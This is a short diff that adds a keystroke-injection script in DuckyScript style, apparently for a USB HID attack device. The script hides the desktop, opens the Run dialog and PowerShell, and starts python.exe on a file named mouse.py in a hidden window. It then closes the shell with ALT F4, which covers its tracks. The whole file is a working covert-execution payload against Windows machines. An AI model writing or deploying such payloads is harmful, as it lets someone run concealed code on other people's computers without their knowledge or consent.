@@ -1,0 +1,13 @@
+DEFINE #SCRIPTURL mouse.py
+
+GUI d
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+STRINGLN Start-Process python.exe -ArgumentList #SCRIPTURL -WindowStyle Hidden
+DELAY 1000
+ALT F4
